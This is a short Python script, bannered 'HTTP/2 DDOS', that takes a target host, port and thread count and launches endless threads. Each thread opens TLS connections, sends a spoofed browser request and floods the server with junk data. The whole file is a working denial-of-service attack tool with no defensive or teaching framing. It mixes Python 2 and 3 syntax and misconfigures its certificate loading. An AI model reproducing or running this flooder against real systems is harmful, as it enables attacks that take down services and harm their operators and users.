import socket
import ssl
import sys
import time
import random
import threading
import os

os.system("clear")
os.system("figlet HTTP/2 DDOS")
if len(sys.argv) < 4:
    print "Usage: " + sys.argv[0] + " <target> <port> <threads>"
    sys.exit()

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

request = str("GET / HTTP/1.1\r\n" +
              "Host: " + target + "\r\n" +
              "Connection: keep-alive\r\n" +
              "Pragma: no-cache\r\n" +
              "Cache-Control: no-cache\r\n" +
              "Upgrade-Insecure-Requests: 1\r\n" +
              "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\r\n" +
              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
              "DNT: 1\r\n" +
              "Accept-Encoding: gzip, deflate, sdch\r\n" +
              "Accept-Language: en-US,en;q=0.8\r\n" +
              "Accept-Charset: UTF-8\r\n" +
              "\r\n")

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2', 'http/1.1'])
ctx.load_cert_chain(certfile="localhost-privkey.pem", keyfile="localhost-privkey.pem")

class WorkerThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            try:
                s = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=target)
                s.connect((target, port))
                s.send(request.encode())
                for i in range(3000):
                    s.send(str(i).encode() * 1000)
                    print("Thread sent:", i)
                s.close()
            except:
                pass

for i in range(threads):
    WorkerThread().start()
    print("Thread " + str(i + 1) + " created!")

print("Attacking the target now...")

time.sleep(1)

input("Press any key to stop the attack...")

sys.exit(0)
